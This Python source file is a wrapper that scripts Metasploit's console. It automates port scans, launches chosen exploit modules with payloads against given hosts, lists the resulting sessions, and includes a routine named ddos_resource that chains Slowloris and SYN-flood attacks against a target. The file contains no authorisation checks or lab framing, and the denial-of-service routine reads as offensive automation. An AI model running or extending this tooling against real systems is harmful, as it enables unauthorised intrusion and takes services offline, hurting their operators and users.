import asyncio, os, json, re, subprocess, tempfile, time
from typing import Dict, List, Optional
from dataclasses import dataclass, field

@dataclass
class MSFResource:
    commands: List[str] = field(default_factory=list)
    resource_path: str = ""

    def add(self, cmd: str):
        self.commands.append(cmd)

    def save(self, path: Optional[str] = None) -> str:
        if path:
            self.resource_path = path
        else:
            fd, path = tempfile.mkstemp(suffix=".rc", prefix="msf_")
            os.close(fd)
            self.resource_path = path
        with open(self.resource_path, "w") as f:
            f.write("\n".join(self.commands) + "\n")
        return self.resource_path

class MetasploitWrapper:
    def __init__(self, msf_path: str = ""):
        self.msf_path = msf_path or self._auto_detect()
        self.running = False

    def _auto_detect(self) -> str:
        candidates = [
            r"C:\metasploit\msfconsole.bat",
            r"C:\Metasploit\msfconsole.bat",
            r"C:\tools\metasploit\msfconsole.bat",
            "/usr/bin/msfconsole",
            "/opt/metasploit-framework/bin/msfconsole",
        ]
        for c in candidates:
            if os.path.exists(c):
                return c
        return "msfconsole"

    def available(self) -> bool:
        try:
            if os.path.exists(self.msf_path):
                return True
            result = subprocess.run(
                ["where", "msfconsole"] if os.name == "nt" else ["which", "msfconsole"],
                capture_output=True, text=True, timeout=5
            )
            return result.returncode == 0
        except:
            return False

    async def run_async(self, resource: MSFResource, timeout: int = 120) -> Dict:
        results = {"success": False, "output": "", "error": ""}
        rc_path = resource.save()
        try:
            proc = await asyncio.create_subprocess_exec(
                self.msf_path, "-q", "-r", rc_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=tempfile.gettempdir()
            )
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                results["output"] = (stdout or b"").decode("utf-8", errors="replace")
                results["error"] = (stderr or b"").decode("utf-8", errors="replace")
                results["success"] = proc.returncode == 0
            except asyncio.TimeoutError:
                proc.kill()
                results["error"] = "timeout"
        except Exception as e:
            results["error"] = str(e)
        finally:
            try:
                os.unlink(rc_path)
            except:
                pass
        return results

    def _build_module_command(self, module: str, payload: str, rhosts: str, rport: int,
                              options: Dict = None) -> str:
        opts = options or {}
        cmd = f"use {module}\n"
        cmd += f"set PAYLOAD {payload}\n"
        cmd += f"set RHOSTS {rhosts}\n"
        cmd += f"set RPORT {rport}\n"
        for k, v in opts.items():
            cmd += f"set {k} {v}\n"
        cmd += "check\n"
        cmd += "run -j -z\n"
        return cmd

    def ddos_resource(self, target: str, threads: int = 50, duration: int = 60) -> MSFResource:
        rc = MSFResource()
        rc.add("spool /tmp/msf_spool.log")
        rc.add("use auxiliary/dos/http/slowloris")
        rc.add(f"set RHOSTS {target}")
        rc.add("set RPORT 80")
        rc.add(f"set THREADS {threads}")
        rc.add("set SSL false")
        rc.add("run")
        rc.add("use auxiliary/dos/tcp/synflood")
        rc.add(f"set RHOSTS {target}")
        rc.add("set RPORT 80")
        rc.add(f"set THREADS {threads}")
        rc.add(f"set TIMEOUT {duration}")
        rc.add("run")
        rc.add("exit")
        return rc

    async def scan_auxiliary(self, target: str, module: str = "scanner/portscan/tcp",
                             ports: str = "80,443,8080,8443") -> Dict:
        rc = MSFResource()
        rc.add(f"use {module}")
        rc.add(f"set RHOSTS {target}")
        if module == "scanner/portscan/tcp":
            rc.add(f"set PORTS {ports}")
        elif module == "scanner/http/http_version":
            pass
        rc.add("run")
        rc.add("exit")
        return await self.run_async(rc, timeout=60)

    async def exploit(self, module: str, payload: str, rhosts: str, rport: int = 80,
                      options: Dict = None, timeout: int = 120) -> Dict:
        cmd = self._build_module_command(module, payload, rhosts, rport, options)
        rc = MSFResource()
        for line in cmd.strip().split("\n"):
            rc.add(line)
        rc.add("exit")
        return await self.run_async(rc, timeout=timeout)

    async def get_sessions(self) -> List[str]:
        rc = MSFResource()
        rc.add("sessions -l")
        rc.add("exit")
        result = await self.run_async(rc, timeout=15)
        sessions = []
        if result["success"]:
            for line in result["output"].split("\n"):
                m = re.match(r"\s*(\d+)\s", line)
                if m:
                    sessions.append(m.group(1))
        return sessions
